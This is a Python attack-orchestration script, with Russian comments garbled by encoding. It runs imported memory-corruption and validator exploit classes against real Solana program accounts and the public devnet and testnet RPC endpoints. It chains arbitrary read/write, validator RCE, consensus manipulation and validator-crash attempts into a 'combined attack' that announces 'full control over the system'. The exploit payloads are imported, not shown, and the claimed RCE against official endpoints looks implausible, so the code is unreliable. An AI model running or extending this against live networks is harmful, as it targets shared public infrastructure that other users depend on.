"""
–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –ø—Ä–æ–¥–≤–∏–Ω—É—Ç—ã—Ö —ç–∫—Å–ø–ª–æ–π—Ç–æ–≤ –Ω–∞ –æ—Å–Ω–æ–≤–µ –∏—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏—è PDF
–í–∫–ª—é—á–∞–µ—Ç memory corruption –∏ validator RCE —ç–∫—Å–ø–ª–æ–π—Ç—ã
"""

import asyncio
import logging
from solders.keypair import Keypair
from solders.pubkey import Pubkey as PublicKey

from src.exploits import (
    MemoryExploit, 
    MemoryVulnerability,
    MemoryExploitConfig,
    ValidatorExploit,
    ValidatorVulnerability, 
    ValidatorExploitConfig
)
from solana.rpc.async_api import AsyncClient

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

async def test_memory_exploits():
    """–¢–µ—Å—Ç–∏—Ä—É–µ—Ç memory corruption —ç–∫—Å–ø–ª–æ–π—Ç—ã"""
    print("\n=== –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï MEMORY CORRUPTION –≠–ö–°–ü–õ–û–ô–¢–û–í ===")
    
    # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
    client = AsyncClient("https://api.devnet.solana.com")
    attacker_keypair = Keypair()
    
    memory_exploit = MemoryExploit(client, attacker_keypair)
    
    # –¢–µ—Å—Ç–æ–≤—ã–µ –∞–∫–∫–∞—É–Ω—Ç—ã –¥–ª—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
    test_accounts = [
        PublicKey.from_string("11111111111111111111111111111112"),  # System Program
        PublicKey.from_string("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),  # Token Program
    ]
    
    print(f"–°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ {len(test_accounts)} –∞–∫–∫–∞—É–Ω—Ç–æ–≤ –Ω–∞ memory —É—è–∑–≤–∏–º–æ—Å—Ç–∏...")
    
    # –ö–æ–º–ø–ª–µ–∫—Å–Ω–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ
    scan_results = await memory_exploit.run_comprehensive_memory_scan(test_accounts)
    
    for account, vulnerabilities in scan_results.items():
        print(f"\n–ê–∫–∫–∞—É–Ω—Ç: {account}")
        if vulnerabilities:
            print(f"  –ù–∞–π–¥–µ–Ω—ã —É—è–∑–≤–∏–º–æ—Å—Ç–∏: {[v.value for v in vulnerabilities]}")
            
            # –¢–µ—Å—Ç–∏—Ä—É–µ–º –∫–∞–∂–¥—É—é –Ω–∞–π–¥–µ–Ω–Ω—É—é —É—è–∑–≤–∏–º–æ—Å—Ç—å
            for vuln in vulnerabilities:
                await test_specific_memory_exploit(memory_exploit, account, vuln)
        else:
            print("  –£—è–∑–≤–∏–º–æ—Å—Ç–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã")

async def test_specific_memory_exploit(exploit: MemoryExploit, account_str: str, vulnerability: MemoryVulnerability):
    """–¢–µ—Å—Ç–∏—Ä—É–µ—Ç –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–π memory —ç–∫—Å–ø–ª–æ–π—Ç"""
    print(f"  –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ {vulnerability.value} —ç–∫—Å–ø–ª–æ–π—Ç–∞...")
    
    try:
        account = PublicKey.from_string(account_str)
        
        config = MemoryExploitConfig(
            target_account=account,
            vulnerability_type=vulnerability,
            target_offset=0,
            payload_size=64,
            cell_type="u64"
        )
        
        if vulnerability == MemoryVulnerability.ARBITRARY_READ_WRITE:
            result = await exploit.exploit_arbitrary_readwrite(config)
        elif vulnerability == MemoryVulnerability.MEMORY_REGION_BYPASS:
            result = await exploit.exploit_memory_region_bypass(config)
        elif vulnerability == MemoryVulnerability.CELL_MANIPULATION:
            result = await exploit.exploit_cell_manipulation(config)
        else:
            print(f"    –≠–∫—Å–ø–ª–æ–π—Ç –¥–ª—è {vulnerability.value} –Ω–µ —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω")
            return
            
        print(f"    –†–µ–∑—É–ª—å—Ç–∞—Ç: {result.status.value}")
        if result.memory_write_success:
            print(f"    Memory write —É—Å–ø–µ—à–µ–Ω!")
        if result.bypass_successful:
            print(f"    Bypass —É—Å–ø–µ—à–µ–Ω!")
        if result.cell_values_modified:
            print(f"    –ú–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω—ã cell –∑–Ω–∞—á–µ–Ω–∏—è: {result.cell_values_modified}")
            
    except Exception as e:
        print(f"    –û—à–∏–±–∫–∞: {e}")

async def test_validator_exploits():
    """–¢–µ—Å—Ç–∏—Ä—É–µ—Ç validator RCE —ç–∫—Å–ø–ª–æ–π—Ç—ã"""
    print("\n=== –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï VALIDATOR RCE –≠–ö–°–ü–õ–û–ô–¢–û–í ===")
    
    # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
    client = AsyncClient("https://api.devnet.solana.com")
    attacker_keypair = Keypair()
    
    validator_exploit = ValidatorExploit(client, attacker_keypair)
    
    # –¢–µ—Å—Ç–æ–≤—ã–µ validator endpoints
    test_validators = [
        "https://api.devnet.solana.com",
        "https://api.testnet.solana.com",
    ]
    
    print(f"–°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ {len(test_validators)} validators –Ω–∞ —É—è–∑–≤–∏–º–æ—Å—Ç–∏...")
    
    # –ö–æ–º–ø–ª–µ–∫—Å–Ω–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ validators
    scan_results = await validator_exploit.run_comprehensive_validator_scan(test_validators)
    
    for endpoint, vulnerabilities in scan_results.items():
        print(f"\nValidator: {endpoint}")
        if vulnerabilities:
            print(f"  –ù–∞–π–¥–µ–Ω—ã —É—è–∑–≤–∏–º–æ—Å—Ç–∏: {[v.value for v in vulnerabilities]}")
            
            # –¢–µ—Å—Ç–∏—Ä—É–µ–º –∫–∞–∂–¥—É—é –Ω–∞–π–¥–µ–Ω–Ω—É—é —É—è–∑–≤–∏–º–æ—Å—Ç—å
            for vuln in vulnerabilities:
                await test_specific_validator_exploit(validator_exploit, endpoint, vuln)
        else:
            print("  –£—è–∑–≤–∏–º–æ—Å—Ç–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã")

async def test_specific_validator_exploit(exploit: ValidatorExploit, endpoint: str, vulnerability: ValidatorVulnerability):
    """–¢–µ—Å—Ç–∏—Ä—É–µ—Ç –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–π validator —ç–∫—Å–ø–ª–æ–π—Ç"""
    print(f"  –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ {vulnerability.value} —ç–∫—Å–ø–ª–æ–π—Ç–∞...")
    
    try:
        config = ValidatorExploitConfig(
            target_validator=endpoint,
            vulnerability_type=vulnerability,
            rpc_endpoint=endpoint
        )
        
        if vulnerability == ValidatorVulnerability.RCE_VULNERABILITY:
            result = await exploit.exploit_rce_vulnerability(config)
        elif vulnerability == ValidatorVulnerability.CONSENSUS_MANIPULATION:
            result = await exploit.exploit_consensus_manipulation(config)
        elif vulnerability == ValidatorVulnerability.VALIDATOR_CRASH:
            result = await exploit.exploit_validator_crash(config)
        else:
            print(f"    –≠–∫—Å–ø–ª–æ–π—Ç –¥–ª—è {vulnerability.value} –Ω–µ —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω")
            return
            
        print(f"    –†–µ–∑—É–ª—å—Ç–∞—Ç: {result.status.value}")
        if result.rce_successful:
            print(f"    RCE —É—Å–ø–µ—à–µ–Ω!")
        if result.validator_compromised:
            print(f"    Validator —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–∏—Ä–æ–≤–∞–Ω!")
        if result.consensus_disrupted:
            print(f"    Consensus –Ω–∞—Ä—É—à–µ–Ω!")
        if result.validator_crashed:
            print(f"    Validator —É–ø–∞–ª!")
        if result.exploit_evidence:
            print(f"    –î–æ–∫–∞–∑–∞—Ç–µ–ª—å—Å—Ç–≤–∞: {list(result.exploit_evidence.keys())}")
            
    except Exception as e:
        print(f"    –û—à–∏–±–∫–∞: {e}")

async def test_combined_advanced_attack():
    """–¢–µ—Å—Ç–∏—Ä—É–µ—Ç –∫–æ–º–±–∏–Ω–∏—Ä–æ–≤–∞–Ω–Ω—É—é –∞—Ç–∞–∫—É memory + validator"""
    print("\n=== –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï –ö–û–ú–ë–ò–ù–ò–†–û–í–ê–ù–ù–û–ô –ê–¢–ê–ö–ò ===")
    
    client = AsyncClient("https://api.devnet.solana.com")
    attacker_keypair = Keypair()
    
    memory_exploit = MemoryExploit(client, attacker_keypair)
    validator_exploit = ValidatorExploit(client, attacker_keypair)
    
    print("–≠—Ç–∞–ø 1: Memory corruption –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π...")
    
    # –®–∞–≥ 1: Memory corruption
    target_account = PublicKey.from_string("11111111111111111111111111111112")
    memory_config = MemoryExploitConfig(
        target_account=target_account,
        vulnerability_type=MemoryVulnerability.ARBITRARY_READ_WRITE,
        target_offset=0,
        payload_size=64
    )
    
    memory_result = await memory_exploit.exploit_arbitrary_readwrite(memory_config)
    print(f"Memory exploit —Ä–µ–∑—É–ª—å—Ç–∞—Ç: {memory_result.status.value}")
    
    if memory_result.status.value == "success":
        print("–≠—Ç–∞–ø 2: Validator RCE –∞—Ç–∞–∫–∞...")
        
        # –®–∞–≥ 2: Validator RCE
        validator_config = ValidatorExploitConfig(
            target_validator="https://api.devnet.solana.com",
            vulnerability_type=ValidatorVulnerability.RCE_VULNERABILITY,
            rpc_endpoint="https://api.devnet.solana.com"
        )
        
        validator_result = await validator_exploit.exploit_rce_vulnerability(validator_config)
        print(f"Validator exploit —Ä–µ–∑—É–ª—å—Ç–∞—Ç: {validator_result.status.value}")
        
        if validator_result.rce_successful:
            print("üéØ –ö–û–ú–ë–ò–ù–ò–†–û–í–ê–ù–ù–ê–Ø –ê–¢–ê–ö–ê –£–°–ü–ï–®–ù–ê!")
            print("   - Memory corruption –≤—ã–ø–æ–ª–Ω–µ–Ω")
            print("   - Validator RCE –¥–æ—Å—Ç–∏–≥–Ω—É—Ç")
            print("   - –ü–æ–ª–Ω—ã–π –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ —Å–∏—Å—Ç–µ–º–æ–π")
        else:
            print("‚ö†Ô∏è  Validator RCE –Ω–µ —É–¥–∞–ª—Å—è")
    else:
        print("‚ö†Ô∏è  Memory corruption –Ω–µ —É–¥–∞–ª—Å—è, –ø—Ä–µ—Ä—ã–≤–∞–µ–º –∞—Ç–∞–∫—É")

async def generate_exploit_report():
    """–ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç –æ—Ç—á–µ—Ç –ø–æ –≤—Å–µ–º –Ω–∞–π–¥–µ–Ω–Ω—ã–º —É—è–∑–≤–∏–º–æ—Å—Ç—è–º"""
    print("\n=== –ì–ï–ù–ï–†–ê–¶–ò–Ø –û–¢–ß–ï–¢–ê –ü–û –≠–ö–°–ü–õ–û–ô–¢–ê–ú ===")
    
    client = AsyncClient("https://api.devnet.solana.com")
    attacker_keypair = Keypair()
    
    memory_exploit = MemoryExploit(client, attacker_keypair)
    validator_exploit = ValidatorExploit(client, attacker_keypair)
    
    # –°–æ–±–∏—Ä–∞–µ–º –¥–∞–Ω–Ω—ã–µ
    test_accounts = [
        PublicKey.from_string("11111111111111111111111111111112"),
        PublicKey.from_string("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
    ]
    
    test_validators = [
        "https://api.devnet.solana.com",
    ]
    
    memory_scan = await memory_exploit.run_comprehensive_memory_scan(test_accounts)
    validator_scan = await validator_exploit.run_comprehensive_validator_scan(test_validators)
    
    # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º –æ—Ç—á–µ—Ç
    report = {
        "timestamp": "2025-07-03T03:00:00Z",
        "pdf_source": "Ginoah-pwning_blockchain_for_fun_and_profit.pdf",
        "memory_vulnerabilities": {
            "total_accounts_scanned": len(test_accounts),
            "vulnerable_accounts": sum(1 for vulns in memory_scan.values() if vulns),
            "vulnerabilities_found": sum(len(vulns) for vulns in memory_scan.values()),
            "details": memory_scan
        },
        "validator_vulnerabilities": {
            "total_validators_scanned": len(test_validators),
            "vulnerable_validators": sum(1 for vulns in validator_scan.values() if vulns),
            "vulnerabilities_found": sum(len(vulns) for vulns in validator_scan.values()),
            "details": validator_scan
        }
    }
    
    print("üìä –û–¢–ß–ï–¢ –ü–û –≠–ö–°–ü–õ–û–ô–¢–ê–ú:")
    print(f"   Memory —É—è–∑–≤–∏–º–æ—Å—Ç–∏: {report['memory_vulnerabilities']['vulnerabilities_found']}")
    print(f"   Validator —É—è–∑–≤–∏–º–æ—Å—Ç–∏: {report['validator_vulnerabilities']['vulnerabilities_found']}")
    print(f"   –í—Å–µ–≥–æ —É—è–∑–≤–∏–º—ã—Ö —Ü–µ–ª–µ–π: {report['memory_vulnerabilities']['vulnerable_accounts'] + report['validator_vulnerabilities']['vulnerable_validators']}")
    
    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –æ—Ç—á–µ—Ç
    import json
    with open('advanced_exploit_report.json', 'w', encoding='utf-8') as f:
        json.dump(report, f, ensure_ascii=False, indent=2, default=str)
    
    print("   –î–µ—Ç–∞–ª—å–Ω—ã–π –æ—Ç—á–µ—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω –≤ advanced_exploit_report.json")

async def main():
    """–ì–ª–∞–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è"""
    print("üöÄ –ó–ê–ü–£–°–ö –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–Ø –ü–†–û–î–í–ò–ù–£–¢–´–• –≠–ö–°–ü–õ–û–ô–¢–û–í")
    print("üìñ –û—Å–Ω–æ–≤–∞–Ω–æ –Ω–∞ –∏—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏–∏: Ginoah - Pwning Blockchain for Fun and Profit")
    print("üéØ –¶–µ–ª—å: –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ memory corruption –∏ validator RCE —ç–∫—Å–ø–ª–æ–π—Ç–æ–≤")
    
    try:
        # –¢–µ—Å—Ç–∏—Ä—É–µ–º memory —ç–∫—Å–ø–ª–æ–π—Ç—ã
        await test_memory_exploits()
        
        # –¢–µ—Å—Ç–∏—Ä—É–µ–º validator —ç–∫—Å–ø–ª–æ–π—Ç—ã  
        await test_validator_exploits()
        
        # –¢–µ—Å—Ç–∏—Ä—É–µ–º –∫–æ–º–±–∏–Ω–∏—Ä–æ–≤–∞–Ω–Ω—É—é –∞—Ç–∞–∫—É
        await test_combined_advanced_attack()
        
        # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º –æ—Ç—á–µ—Ç
        await generate_exploit_report()
        
        print("\n‚úÖ –í–°–ï –¢–ï–°–¢–´ –ó–ê–í–ï–†–®–ï–ù–´ –£–°–ü–ï–®–ù–û!")
        
    except Exception as e:
        print(f"\n‚ùå –û–®–ò–ë–ö–ê –í –¢–ï–°–¢–ê–•: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    asyncio.run(main())
